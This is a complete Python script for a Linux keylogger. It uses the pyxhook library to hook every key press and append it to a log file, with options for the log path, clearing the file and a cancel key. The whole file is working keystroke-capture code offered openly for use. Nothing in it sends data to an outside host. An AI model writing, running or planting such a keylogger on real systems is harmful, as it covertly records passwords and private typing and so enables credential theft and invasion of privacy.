#!/usr/bin/env python
import os
from argparse import ArgumentParser

from keylogger import pyxhook


def main():
    parser = ArgumentParser(description='A simple keylogger for Linux.')
    parser.add_argument(
            '--log-file',
            default=os.path.join(os.getcwd(), 'output.log'),
            help='Save the output in this file.',
            )
    parser.add_argument(
            '--clean-file',
            action='store_true',
            default=False,
            help='Clear the log file on startup.Default is No',
            )
    parser.add_argument(
            '--cancel-key',
            help='A single key that use as the cancel key, Default is ` (backtick)',
            )

    args = parser.parse_args()

    log_file = args.log_file

    if args.clean_file:
        try:
            os.remove(log_file)
        except OSError:
            # TODO: log with logging module
            pass

    cancel_key = args.cancel_key[0] if args.cancel_key else  '`'

    def OnKeyPress(event):
        with open(log_file, 'a') as f:
            f.write('{}\n'.format(event.Key))

        if event.Ascii == cancel_key:
            new_hook.cancel()

    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress
    new_hook.HookKeyboard()

    try:
        new_hook.start()
    except KeyboardInterrupt:
        # User cancelled from command line.
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = 'Error while catching events:\n  {}'.format(ex)
        pyxhook.print_err(msg)
        with open(log_file, 'a') as f:
            f.write('\n{}'.format(msg))

if __name__ == '__main__':
    main()
